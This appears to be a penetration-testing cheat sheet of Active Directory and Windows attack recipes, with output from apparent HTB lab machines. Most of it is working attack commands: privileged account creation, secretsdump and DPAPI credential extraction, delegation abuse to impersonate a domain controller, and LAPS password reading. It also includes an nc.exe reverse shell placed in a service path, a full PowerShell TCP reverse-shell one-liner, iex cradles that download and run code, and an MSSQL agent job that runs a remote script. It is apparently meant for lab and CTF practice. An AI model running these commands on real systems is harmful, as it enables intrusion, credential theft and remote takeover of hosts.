item.title: Account Operators
item.description:
Authentication Method

Create a New User Account and Add it to Privilege Group

1. Create a New User Account

# Password
bloodyAD -d '<DOMAIN>' -u '<USER>' -p '<PASSWORD>' --host '<TARGET>' add user '<NEW_USER>' '<NEW_PASSWORD>'

# NTLM
bloodyAD -d '<DOMAIN>' -u '<USER>' -p ':<HASH>' -f rc4 --host '<TARGET>' add user '<NEW_USER>' '<NEW_PASSWORD>'

# Password-based Kerberos
bloodyAD -d '<DOMAIN>' -u '<USER>' -p '<PASSWORD>' -k --host '<TARGET>' add user '<NEW_USER>' '<NEW_PASSWORD>'

# NTLM-based Kerberos
bloodyAD -d '<DOMAIN>' -u '<USER>' -p '<HASH>' -f rc4 -k --host '<TARGET>' add user '<NEW_USER>' '<NEW_PASSWORD>'

# Ticket-based Kerberos
bloodyAD -d '<DOMAIN>' -u '<USER>' -k --host '<TARGET>' add user '<NEW_USER>' '<NEW_PASSWORD>'

2. Add the New User to Privilege Group

# Password
bloodyAD -d '<DOMAIN>' -u '<USER>' -p '<PASSWORD>' --host '<TARGET>' add groupMember '<GROUP>' '<NEW_USER>'

# NTLM
bloodyAD -d '<DOMAIN>' -u '<USER>' -p ':<HASH>' -f rc4 --host '<TARGET>' add groupMember '<GROUP>' '<NEW_USER>'

# Password-based Kerberos
bloodyAD -d '<DOMAIN>' -u '<USER>' -p '<PASSWORD>' -k --host '<TARGET>' add groupMember '<GROUP>' '<NEW_USER>'

# NTLM-based Kerberos
bloodyAD -d '<DOMAIN>' -u '<USER>' -p '<HASH>' -f rc4 -k --host '<TARGET>' add groupMember '<GROUP>' '<NEW_USER>'

# Ticket-based Kerberos
bloodyAD -d '<DOMAIN>' -u '<USER>' -k --host '<TARGET>' add groupMember '<GROUP>' '<NEW_USER>'

3. Secrets Dump

# Password
impacket-secretsdump '<DOMAIN>/<NEW_USER>:<NEW_PASSWORD>@<TARGET>'

# NTLM
impacket-secretsdump '<DOMAIN>/<NEW_USER>@<TARGET>' -hashes :<HASH>

# Password-based Kerberos
impacket-secretsdump '<DOMAIN>/<NEW_USER>:<NEW_PASSWORD>@<TARGET>' -k

# NTLM-based Kerberos
impacket-secretsdump '<DOMAIN>/<NEW_USER>@<TARGET>' -hashes :<HASH> -k

# Ticket-based Kerberos
impacket-secretsdump '<DOMAIN>/<NEW_USER>@<TARGET>' -k

1. Import PowerView.ps1

. .\PowerView.ps1

*Evil-WinRM* PS C:\programdata> . .\PowerView.ps1

2. Create a New User Password Object

$new_user_password = ConvertTo-SecureString '<NEW_USER_PASSWORD>' -AsPlainText -Force

*Evil-WinRM* PS C:\programdata> $new_user_password = ConvertTo-SecureString 'Test1234' -AsPlainText -Force

3. Create a New User Account

New-AdUser '<NEW_USER>' -enabled $true -accountpassword $new_user_password

*Evil-WinRM* PS C:\programdata> New-AdUser 'alice' -enabled $true -accountpassword $new_user_password

4. Add the New User to LAPS Group

Add-DomainGroupMember -Identity 'LAPS READ' -Members '<NEW_USER>'

*Evil-WinRM* PS C:\programdata> Add-DomainGroupMember -Identity 'LAPS READ' -Members 'alice'

5. Add the New User to WinRM Group

Add-DomainGroupMember -Identity 'WinRM' -Members '<NEW_USER>'

*Evil-WinRM* PS C:\programdata> Add-DomainGroupMember -Identity WinRM -Members 'alice'

6. Remote as New User

# Password
evil-winrm -i <TARGET> -u '<NEW_USER>' -p '<NEW_USER_PASSWORD>'

$ evil-winrm -i 127.0.0.1 -u alice -p 'Test1234'              
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\alice\Documents> 

# NTLM
evil-winrm -i <TARGET> -u '<NEW_USER>' -H '<NEW_HASH>'

# Ticket-based Kerberos
evil-winrm -i <TARGET> -r <DOMAIN>

7. Read LAPS Password

Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd

*Evil-WinRM* PS C:\Users\alice\Documents> Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd

DistinguishedName : CN=PIVOTAPI,OU=Domain Controllers,DC=LicorDeBellota,DC=htb
DNSHostName       : PivotAPI.LicorDeBellota.htb
Enabled           : True

item.title: AD Recycle Bin
item.description:
Authentication Method

Restore Deleted AD Object

1. Import AD Module

Import-Module ActiveDirectory

evil-winrm-py PS C:\> Import-Module ActiveDirectory

2. Query All Deleted Objects within Domain

Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects

evil-winrm-py PS C:\> Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects


Deleted           : True
DistinguishedName : CN=cert_admin\0ADEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3,CN=Deleted Objects,DC=tombwatcher,DC=htb

4. Restore the Deleted Object

# Rename the target account to avoid user exists error
Restore-ADObject -Identity <OBJECT_GUID> -NewName '<DELETED_USER>.2' -TargetPath 'CN=Users,DC=<EXAMPLE>,DC=<COM>'

# Or
Restore-ADObject -Identity "<DISTINGUISHED_NAME>"

item.title: ADFS
item.description:

# With ADFS service account
.\ADFSDump.exe

item.title: ADIDNS
item.description:
Authentication Method

Enumeration

1. DNS Dump

# Password
bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> get dnsDump

# NTLM
bloodyAD -d <DOMAIN> -u '<USER>' -p ':<HASH>' -f rc4 --host <DC> get dnsDump

# Password-based Kerberos
bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -k --host <DC> get dnsDump

# NTLM-based Kerberos
 bloodyAD -d <DOMAIN> -u '<USER>' -p '<HASH>' -f rc4 -k --host <DC> get dnsDump

# Ticket-based Kerberos
bloodyAD -d <DOMAIN> -u '<USER>' -k --host <DC> get dnsDump

1. Import Powermad

. .\Powermad.ps1

2. Enumerate

# Get ADIDNS zone
Get-ADIDNSZone

# Get ADIDNS permissions
Get-ADIDNSPermission

# Remove a wildcard node
Remove-ADIDNSNode -Node *

item.title: AllowedToDelegate
item.description:
Authentication Method

Forge a Ticket

1. Pre-Check

# Password
impacket-findDelegation '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>

$ impacket-findDelegation 'intelligence.htb/svc_int$:Password123!' -dc-ip 10.129.31.133

-----------  -----------------------------------  ----------------------------------  -----------------------  ----------
svc_int$     ms-DS-Group-Managed-Service-Account  Constrained w/ Protocol Transition  WWW/dc.intelligence.htb  No 

# NTLM
impacket-findDelegation '<DOMAIN>/<USER>' -hashes :<HASH> -dc-ip <DC_IP>

$ impacket-findDelegation 'intelligence.htb/svc_int$' -hashes :655fefd062c233e273bb9f0566384474 -dc-ip 10.129.31.133

$ sudo ntpdate -s 'dc.intelligence.htb' && impacket-findDelegation 'intelligence.htb/svc_int$:Password123!' -k -dc-ip 10.129.31.133

item.title: Azure AD Connect
item.description:
Abuse #1: Azure AD Connect Password Extraction

1. Start ADSync Service

Set-Service -name adsync -StartupType automatic

Set-Service -name adsync -status running -passthru

Set-Service -name adsync -status running -passthru

Running  adsync             Microsoft Azure AD Sync

2. Download ADSync.mdf and ADSync_log.LDF

python3 adconnectdump.py <DOMAIN>/<USER>@<TARGET_DOMAIN> -hashes :<HASH>

$ python3 adconnectdump.py SRV001/Administrator@srv001.example.local -hashes :7ddf32e17a6ac5ce04a8ecbf782ca509

item.title: Built-in Group
item.description:
Abuse #1. Modify Service Path

# Start a nc listener
rlwrap nc -lvnp <LOCAL_PORT>

$ rlwrap nc -lvnp 443
listening on [any] 443 ...

1. Change Service Path

# Assumed nc.exe is uploaded
sc.exe config <SERVICE> binpath="C:\ProgramData\nc.exe -e cmd <LOCAL_IP> <LOCAL_PORT>"

*Evil-WinRM* PS C:\ProgramData> sc.exe config VSS binpath="C:\ProgramData\nc.exe -e cmd 10.10.14.44 443"
[SC] ChangeServiceConfig SUCCESS

2. Restart Service

# Stop service
sc.exe stop <SERVICE>

*Evil-WinRM* PS C:\windows\tasks> sc.exe stop VSS
[SC] ControlService FAILED 1062:

The service has not been started.

# Start service
sc.exe start <SERVICE>

[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.

item.title: Constrained Delegation
item.description:
Authentication Method

Constrained Delegation

1. Control of a Machine Account

# Password
bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> set password '<TARGET_MACHINE>$' '<NEW_PASSWORD>'

$ bloodyAD -d redelegate.vl -u 'helen.frost' -p 'Password123!' --host 10.129.31.186 set password 'FS01$' 'Password123!'
[+] Password changed successfully!

# NTLM
bloodyAD -d <DOMAIN> -u '<USER>' -p ':<HASH>' -f rc4 --host <DC> set password '<TARGET_MACHINE>$' '<NEW_PASSWORD>'

$ bloodyAD -d redelegate.vl -u 'helen.frost' -p ':2B576ACBE6BCFDA7294D6BD18041B8FE' -f rc4 --host DC.REDELEGATE.VL set password 'FS01$' 'Password123!'
[+] Password changed successfully!

# Password-based Kerberos
bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -k --host <DC> set password '<TARGET_MACHINE>$' '<NEW_PASSWORD>'

$ bloodyAD -d redelegate.vl -u 'helen.frost' -p 'Password123!' -k --host DC.REDELEGATE.VL set password 'FS01$' 'Password123!'
[+] Password changed successfully!

# NTLM-based Kerberos
 bloodyAD -d <DOMAIN> -u '<USER>' -p '<HASH>' -f rc4 -k --host <DC> set password '<TARGET_MACHINE>$' '<NEW_PASSWORD>'

$ bloodyAD -d redelegate.vl -u 'helen.frost' -p '2B576ACBE6BCFDA7294D6BD18041B8FE' -f rc4 -k --host DC.REDELEGATE.VL set password 'FS01$' 'Password123!'
[+] Password changed successfully!

# Ticket-based Kerberos
bloodyAD -d <DOMAIN> -u '<USER>' -k --host <DC> set password '<TARGET_MACHINE>$' '<NEW_PASSWORD>'

$ bloodyAD -d redelegate.vl -u 'helen.frost' -k --host DC.REDELEGATE.VL set password 'FS01$' 'Password123!'
[+] Password changed successfully!

2. Set msDS-AllowedToDelegateTo to Target SPN

# Password
bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> set object 'CN=<TARGET_MACHINE>,CN=COMPUTERS,DC=<EXAMPLE>,DC=<COM>' 'msDS-AllowedToDelegateTo' -v '<SPN>'

$ bloodyAD -d redelegate.vl -u 'helen.frost' -p 'Password123!' --host DC.REDELEGATE.VL set object 'CN=FS01,CN=COMPUTERS,DC=REDELEGATE,DC=VL' 'msDS-AllowedToDelegateTo' -v 'ldap/dc.redelegate.vl'
[+] CN=FS01,CN=COMPUTERS,DC=REDELEGATE,DC=VL's msDS-AllowedToDelegateTo has been updated

# NTLM
bloodyAD -d <DOMAIN> -u '<USER>' -p ':<HASH>' -f rc4 --host <DC> set object 'CN=<TARGET_MACHINE>,CN=COMPUTERS,DC=<EXAMPLE>,DC=<COM>' 'msDS-AllowedToDelegateTo' -v '<SPN>'

$ bloodyAD -d redelegate.vl -u 'helen.frost' -p ':2B576ACBE6BCFDA7294D6BD18041B8FE' -f rc4 --host DC.REDELEGATE.VL set object 'CN=FS01,CN=COMPUTERS,DC=REDELEGATE,DC=VL' 'msDS-AllowedToDelegateTo' -v 'ldap/dc.redelegate.vl'
[+] CN=FS01,CN=COMPUTERS,DC=REDELEGATE,DC=VL's msDS-AllowedToDelegateTo has been updated

# Password-based Kerberos
bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -k --host <DC> set object 'CN=<TARGET_MACHINE>,CN=COMPUTERS,DC=<EXAMPLE>,DC=<COM>' 'msDS-AllowedToDelegateTo' -v '<SPN>'

$ bloodyAD -d redelegate.vl -u 'helen.frost' -p 'Password123!' -k --host DC.REDELEGATE.VL set object 'CN=FS01,CN=COMPUTERS,DC=REDELEGATE,DC=VL' 'msDS-AllowedToDelegateTo' -v 'ldap/dc.redelegate.vl'
[+] CN=FS01,CN=COMPUTERS,DC=REDELEGATE,DC=VL's msDS-AllowedToDelegateTo has been updated

# NTLM-based Kerberos
 bloodyAD -d <DOMAIN> -u '<USER>' -p '<HASH>' -f rc4 -k --host <DC> set object 'CN=<TARGET_MACHINE>,CN=COMPUTERS,DC=<EXAMPLE>,DC=<COM>' 'msDS-AllowedToDelegateTo' -v '<SPN>'

$ bloodyAD -d redelegate.vl -u 'helen.frost' -p '2B576ACBE6BCFDA7294D6BD18041B8FE' -f rc4 -k --host DC.REDELEGATE.VL set object 'CN=FS01,CN=COMPUTERS,DC=REDELEGATE,DC=VL' 'msDS-AllowedToDelegateTo' -v 'ldap/dc.redelegate.vl'
[+] CN=FS01,CN=COMPUTERS,DC=REDELEGATE,DC=VL's msDS-AllowedToDelegateTo has been updated

# Ticket-based Kerberos
bloodyAD -d <DOMAIN> -u '<USER>' -k --host <DC> set object 'CN=<TARGET_MACHINE>,CN=COMPUTERS,DC=<EXAMPLE>,DC=<COM>' 'msDS-AllowedToDelegateTo' -v '<SPN>'

$ bloodyAD -d redelegate.vl -u 'helen.frost' -k --host DC.REDELEGATE.VL set object 'CN=FS01,CN=COMPUTERS,DC=REDELEGATE,DC=VL' 'msDS-AllowedToDelegateTo' -v 'ldap/dc.redelegate.vl'
[+] CN=FS01,CN=COMPUTERS,DC=REDELEGATE,DC=VL's msDS-AllowedToDelegateTo has been updated

3. Set TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION Flag

# Password
bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> add uac '<TARGET_MACHINE>$' -f TRUSTED_TO_AUTH_FOR_DELEGATION

$ bloodyAD -d redelegate.vl -u 'helen.frost' -p 'Password123!' --host DC.REDELEGATE.VL add uac 'FS01$' -f TRUSTED_TO_AUTH_FOR_DELEGATION
[-] ['TRUSTED_TO_AUTH_FOR_DELEGATION'] property flags added to FS01$'s userAccountControl

# NTLM
bloodyAD -d <DOMAIN> -u '<USER>' -p ':<HASH>' -f rc4 --host <DC> add uac '<TARGET_MACHINE>$' -f TRUSTED_TO_AUTH_FOR_DELEGATION

$ bloodyAD -d redelegate.vl -u 'helen.frost' -p ':2B576ACBE6BCFDA7294D6BD18041B8FE' -f rc4 --host DC.REDELEGATE.VL add uac 'FS01$' -f TRUSTED_TO_AUTH_FOR_DELEGATION
[-] ['TRUSTED_TO_AUTH_FOR_DELEGATION'] property flags added to FS01$'s userAccountControl

# Password-based Kerberos
bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -k --host <DC> add uac '<TARGET_MACHINE>$' -f TRUSTED_TO_AUTH_FOR_DELEGATION

$ bloodyAD -d redelegate.vl -u 'helen.frost' -p 'Password123!' -k --host DC.REDELEGATE.VL add uac 'FS01$' -f TRUSTED_TO_AUTH_FOR_DELEGATION
[-] ['TRUSTED_TO_AUTH_FOR_DELEGATION'] property flags added to FS01$'s userAccountControl

# NTLM-based Kerberos
 bloodyAD -d <DOMAIN> -u '<USER>' -p '<HASH>' -f rc4 -k --host <DC> add uac '<TARGET_MACHINE>$' -f TRUSTED_TO_AUTH_FOR_DELEGATION

$ bloodyAD -d redelegate.vl -u 'helen.frost' -p '2B576ACBE6BCFDA7294D6BD18041B8FE' -f rc4 -k --host DC.REDELEGATE.VL add uac 'FS01$' -f TRUSTED_TO_AUTH_FOR_DELEGATION
[-] ['TRUSTED_TO_AUTH_FOR_DELEGATION'] property flags added to FS01$'s userAccountControl

# Ticket-based Kerberos
bloodyAD -d <DOMAIN> -u '<USER>' -k --host <DC> add uac '<TARGET_MACHINE>$' -f TRUSTED_TO_AUTH_FOR_DELEGATION

$ bloodyAD -d redelegate.vl -u 'helen.frost' -k --host DC.REDELEGATE.VL add uac 'FS01$' -f TRUSTED_TO_AUTH_FOR_DELEGATION
[-] ['TRUSTED_TO_AUTH_FOR_DELEGATION'] property flags added to FS01$'s userAccountControl

4. Request a Service Ticket

# Password
sudo ntpdate -s <DC> && impacket-getST '<DOMAIN>/<TARGET_MACHINE>$:<NEW_PASSWORD>' -dc-ip <DC_IP> -spn '<SPN>' -impersonate '<DC_HOSTNAME>'

$ sudo ntpdate -s DC.REDELEGATE.VL && impacket-getST 'redelegate.vl/FS01$:Password123!' -dc-ip 10.129.31.186 -spn 'ldap/dc.redelegate.vl' -impersonate 'DC'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

# NTLM
sudo ntpdate -s <DC> && impacket-getST '<DOMAIN>/<TARGET_MACHINE>$' -hashes :<NEW_HASH> -dc-ip <DC_IP> -spn '<SPN>' -impersonate '<DC_HOSTNAME>'

$ sudo ntpdate -s DC.REDELEGATE.VL && impacket-getST 'redelegate.vl/FS01$' -hashes :2B576ACBE6BCFDA7294D6BD18041B8FE -dc-ip 10.129.31.186 -spn 'ldap/dc.redelegate.vl' -impersonate 'DC'

5. Secrets Dump

export KRB5CCNAME=<CCACHE>

Set-ADAccountControl -Identity "<TARGET_MACHINE>$" -TrustedToAuthForDelegation $True

item.title: DPAPI
item.description:
Abuse #1: Credentials Dump (From Linux)

1. Info Gathering

cmd /c "dir /S /AS C:\Users\<USER>\AppData\Local\Microsoft\Vault & dir /S /AS C:\Users\<USER>\AppData\Local\Microsoft\Credentials & dir /S /AS C:\Users\<USER>\AppData\Local\Microsoft\Protect & dir /S /AS C:\Users\<USER>\AppData\Roaming\Microsoft\Vault & dir /S /AS C:\Users\<USER>\AppData\Roaming\Microsoft\Credentials & dir /S /AS C:\Users\<USER>\AppData\Roaming\Microsoft\Protect"

2. Retrieve Keys

# Get master key
certutil -encode "C:\Users\<USER>\AppData\Roaming\Microsoft\Protect\<SID>\<MASTERKEY>" C:\ProgramData\<MASTERKEY>

# Copy and paste to local Linux
type C:\ProgramData\<MASTERKEY>

# Base64 decode
cat masterkey_b64 | base64 -d > masterkey_file

# Get credential
certutil -encode "C:\Users\<USER>\AppData\Roaming\Microsoft\Credentials\<CREDENTIALS_HASH>" C:\ProgramData\<CREDENTIALS_HASH>

# Copy and paste to local Linux
type C:\ProgramData\<CREDENTIALS_HASH>

# Base64 decode
cat credential_b64 | base64 -d > credential_file

3. Decrypt Credentials

pypykatz dpapi prekey password <SID> '<PASSWORD>' | tee pkf

pypykatz dpapi masterkey masterkey_file pkf -o mkf

pypykatz dpapi credential mkf credential_file

# Password
DonPAPI collect -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -t <TARGET>

# NTLM
DonPAPI collect -d <DOMAIN> -u '<USER>' -H <HASH> -t <TARGET>

# LAPS
DonPAPI collect -u '<USER>' -p '<PASSWORD>' -t <TARGET>

item.title: File Transfer (Linux to Windows)
item.description:
Start a Local HTTP Server

python3 -m http.server <LOCAL_PORT>

$ python3 -m http.server 8443
Serving HTTP on 0.0.0.0 port 8443 (http://0.0.0.0:8443/) ...


# Invoke-WebRequest
iwr http://<LOCAL_IP>:<LOCAL_PORT>/<FILE> -o C:\ProgramData\<FILE>

# Wget
powershell -ep bypass wget <LOCAL_IP>:<LOCAL_PORT>/<FILE> -Outfile C:\ProgramData\<FILE>

# Curl
powershell -ep bypass curl <LOCAL_IP>:<LOCAL_PORT>/<FILE> -Outfile C:\ProgramData\<FILE>

Note: curl and wget are alias to Invoke-WebRequest

# Load into memory and run

# Invoke-Expression
iex (New-Object Net.WebClient).DownloadString('http://<LOCAL_IP>:<LOCAL_PORT>/<FILE>');Invoke-PowerShellTcp -Reverse -IPAddress <LOCAL_IP> -Port <LOCAL_PORT>

# Short version
iex (iwr http://<LOCAL_IP>:<LOCAL_PORT>/<FILE> -UseBasicParsing)

Ref: rev.ps1

item.title: File Transfer (Windows To Linux)
item.description:
Start a Local SMB Server

impacket-smbserver share . -smb2support

cmd

# Connect to SMB server without creds
net use \\<LOCAL_IP>\share

# Connect to SMB server with creds
net use \\<LOCAL_IP>\share /u:<USER> <PASSWORD>

# From target Windows to local Linux
copy <FILE> \\<LOCAL_IP>\share

# From local Linux to target Windows
copy \\<LOCAL_IP>\share\<FILE> <FILE>

# Delete file
del <FILE>

# Remove SMB share
net use /d \\<LOCAL_IP>\share

# Older Windows (e.g. xp), use directly
\\<LOCAL_IP>\share\nc.exe -e cmd.exe <LOCAL_IP> <LOCAL_PORT>

Small Binary

# In target Windows
[System.convert]::ToBase64String((Get-Content -Path 'C:\ProgramData\<FILE>' -Encoding Byte))

# Copy and paste the base64 encoded binary to local Linux
echo -n '<BASE64_BINARY>' | base64 -d > <FILE>

Note: For restricted environment

item.title: File Transfer (Windows To Windows)
item.description:
# Connect to SMB server without creds
net use \\<LOCAL_IP>\share

# Connect to SMB server with server name
net use \\<SERVER_NAME>\share

# Connect to SMB server with creds
net use \\<LOCAL_IP>\share /u:<USER> '<PASSWORD>'

# Mount to a drive with creds
net use X: \\<LOCAL_IP>\share /u:<USER> '<PASSWORD>'

# From local Windows to target Windows
copy <FILE> \\<LOCAL_IP>\share

# From target Windows to local Windows
copy \\<LOCAL_IP>\share\<FILE> <FILE>

# Delete file
del <FILE>

# Remove SMB share
net use /d \\<LOCAL_IP>\share

# Remove drive
net use /d X:

# Older Windows (e.g. xp), use directly
\\<LOCAL_IP>\share\nc.exe -e cmd.exe <LOCAL_IP> <LOCAL_PORT>

item.title: Find (Windows)
item.description:
Show Hidden Files

# Show hidden files in current directory
Get-ChildItem -Force

# Recusive
Get-ChildItem -Path '<PATH>' -Recurse -Force 2>$Null

Find a File

# Find files with keyword
Get-ChildItem -Path "<PATH>" -Recurse -Force -File -Filter "*<KEYWORD>*" 2>$Null

# Find files with wildcard
Get-ChildItem -Path '<PATH>' -Recurse -Force -Include '<PATTERN>' 2>$Null

*Evil-WinRM* PS C:\programdata> Get-ChildItem -Path 'C:\' -Recurse -Force -Include 'flag.*' 2>$Null

    Directory: C:\Users\Administrator\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        10/27/2017   4:02 PM             24 flag.txt

---[SNIP]---

where /R '<PATH>' '<FILE>'

Find a File, with Rules

dir /s /b /a:-d-h <PATH> | findstr /i /v '<STRING>'

+---------------------------------------+
|dir:                                   |
|/s      : include subfolders           |
|/b      : bare format                  |
|/a:-d-h : exclude directories or hidden|
|                                       |
|findstr:                               |
|/i          : case insensitive         |
|/v STRING   : exclude STRING           |
+---------------------------------------+

Find a String Pattern

# Show with file name
Get-ChildItem -Recurse -Force | Select-String -Pattern "FLAG\{.*\}" -AllMatches 2>$Null

# Show only the value
Get-ChildItem -Recurse -Force | Select-String -Pattern "FLAG\{.*\}" -AllMatches 2>$Null | % { $_.Matches } | % { $_.Value }

Find a Command Location

where.exe <COMMAND>

PS C:\Program Files (x86)> where.exe sqlcmd
where.exe sqlcmd
C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\130\Tools\Binn\SQLCMD.EXE

item.title: IP Routing
item.description:
Check Routes

ip route show

Add Route

sudo ip route add <SUBNET> via <GATEWAY> dev <INTERFACE>

sudo ip route add 172.16.0.0/16 via 192.168.1.10 dev eth0

# Treat the gateway as being directly connected
sudo ip route add <SUBNET> via <GATEWAY> dev <INTERFACE> onlink

Modify Route

sudo ip route replace <SUBNET> via <GATEWAY> dev <INTERFACE>

sudo ip route replace 172.16.0.0/16 via 192.168.1.20 dev eth0

Delete Route

sudo ip route del <SUBNET>

sudo ip route del 172.16.0.0/16

# Exact match
sudo ip route del <SUBNET> via <GATEWAY> dev <INTERFACE>

sudo ip route del 172.16.0.0/16 via 192.168.1.10 dev eth0

    dns_lookup_kdc = false
    dns_lookup_realm = false
    default_realm = ADMINISTRATOR.HTB

[realms]
    ADMINISTRATOR.HTB = {
        kdc = dc.administrator.htb
        admin_server = dc.administrator.htb
        default_domain = administrator.htb
    }

[domain_realm]
    .administrator.htb = ADMINISTRATOR.HTB
    administrator.htb = ADMINISTRATOR.HTB

item.title: Metasploit
item.description:
Start Msfconsole

msfconsole -q

General

back

exit

Search Exploit

search <KEYWORD>

search samba

use <NUM>

use 15

# Choose by full path
use <MODULE_PATH>

use exploit/multi/samba/usermap_script

# Show exploit settings
options

# Set option, e.g.
set rhosts <TARGET>

set lhost <LOCAL_IP>

set lport <LOCAL_PORT>

# Run exploit
run

Hint: If you see a session is opened, but sit at an empty line, just type your cmd and press enter

item.title: MSSQL Agent Jobs
item.description:
1. Pre-Check

# List principals
SELECT name FROM sys.database_principals;

# Check privilege over a principal from current user
SELECT entity_name, permission_name FROM fn_my_permissions('<PRINCIPAL>', 'USER');

# Fix : Cannot resolve the collation conflict between "Latin1_General_CI_AI" and "SQL_Latin1_General_CP1_CI_AS"
SELECT entity_name collate DATABASE_DEFAULT,permission_name collate DATABASE_DEFAULT FROM fn_my_permissions('<PRINCIPAL>', 'USER');

# Check SQL credentials
SELECT name, credential_identity FROM sys.credentials;

2. Check Proxy Account Name and Permissions

# Create a table to store info
CREATE TABLE proxies (subsystem_id INT PRIMARY KEY NOT NULL, subsystem_name varchar(255), proxy_id INT, proxy_name varchar(255));

# Insert proxy info into table
EXECUTE AS LOGIN='<PRINCIPAL>'; INSERT proxies EXEC msdb.dbo.sp_enum_proxy_for_subsystem;

# Show proxy info
SELECT subsystem_name, proxy_name FROM proxies;

3. Create Agent Job

Powershell #2

$client = New-Object System.Net.Sockets.TCPClient('<LOCAL_IP>',<LOCAL_PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

Create Job

USE msdb; EXEC AS LOGIN='<PRINCIPAL>'; EXEC dbo.sp_add_job @job_name=N'ANYTHING'; EXEC dbo.sp_add_jobserver @job_name=N'ANYTHING'; EXEC dbo.sp_add_jobstep @job_name = N'ANYTHING', @step_name=N'ExecPayload', @subsystem=N'CmdExec', @command='powershell.exe iex(iwr http://<LOCAL_IP>/shell.ps1)|iex', @retry_attempts=5, @retry_interval=5, @proxy_name=N'<PROXY_NAME>'; EXEC dbo.sp_start_job @job_name = N'ANYTHING';

item.title: MSSQL General
item.description:
Authentication Method

Connection

# Password
impacket-mssqlclient '<USER>:<PASSWORD>@<TARGET>'

# NTLM
impacket-mssqlclient '<USER>@<TARGET>' -hashes :<HASH>

# Password-based Kerberos
impacket-mssqlclient '<USER>:<PASSWORD>@<TARGET>' -k -dc-ip <DC_IP>

# NTLM-based Kerberos
impacket-mssqlclient '<USER>@<TARGET>' -hashes :<HASH> -k -dc-ip <DC_IP>

# Ticket-based Kerberos
impacket-mssqlclient '<USER>@<TARGET>' -k -no-pass -dc-ip <DC_IP>

Windows Auth

# Password
impacket-mssqlclient '<USER>:<PASSWORD>@<TARGET>' -windows-auth

# NTLM
impacket-mssqlclient '<USER>@<TARGET>' -hashes :<HASH> -windows-auth

# Current user
sqlcmd -S '<TARGET>' -Q "<QUERY>"

# Password
sqlcmd -S '<TARGET>' -U '<USER>' -P '<PASSWORD>' -d '<DB_NAME>' -Q "<QUERY>"

item.title: MSSQL Privilege Escalation
item.description:
Authentication Method

Enumeration

1. Check Privesc Path

# Password
nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -M mssql_priv

# NTLM
nxc mssql <TARGET> -u '<USER>' -H '<HASH>' -d <DOMAIN> -M mssql_priv

# Password-based Kerberos
nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -k --kdcHost <DC> -M mssql_priv

# NTLM-based Kerberos
nxc mssql <TARGET> -u '<USER>' -H '<HASH>' -d <DOMAIN> -k --kdcHost <DC> -M mssql_priv

# Ticket-based Kerberos
nxc mssql <TARGET> -u '<USER>' -d <DOMAIN> -k --use-kcache --kdcHost <DC> -M mssql_priv

# Local Auth
nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' --local-auth -M mssql_priv

2. List Users that Can be Impersonated

# Password
nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -M enum_impersonate

# NTLM
nxc mssql <TARGET> -u '<USER>' -H '<HASH>' -d <DOMAIN> -M enum_impersonate

# Password-based Kerberos
nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -k --kdcHost <DC> -M enum_impersonate

# NTLM-based Kerberos
nxc mssql <TARGET> -u '<USER>' -H '<HASH>' -d <DOMAIN> -k --kdcHost <DC> -M enum_impersonate

# Ticket-based Kerberos
nxc mssql <TARGET> -u '<USER>' -d <DOMAIN> -k --use-kcache --kdcHost <DC> -M enum_impersonate

# Local Auth
nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' --local-auth -M enum_impersonate

$ nxc mssql DC.REDELEGATE.VL -u 'SQLGuest' -p 'zDPBpaF4FywlqIv11vii' --local-auth -M enum_impersonate

ENUM_IMP... 10.129.254.242  1433   DC               [-] No users with impersonation rights found.

3. Enumerate Active MSSQL Logins

# Password
nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -M enum_logins

# NTLM
nxc mssql <TARGET> -u '<USER>' -H '<HASH>' -d <DOMAIN> -M enum_logins

# Password-based Kerberos
nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -k --kdcHost <DC> -M enum_logins

# NTLM-based Kerberos
nxc mssql <TARGET> -u '<USER>' -H '<HASH>' -d <DOMAIN> -k --kdcHost <DC> -M enum_logins

# Ticket-based Kerberos
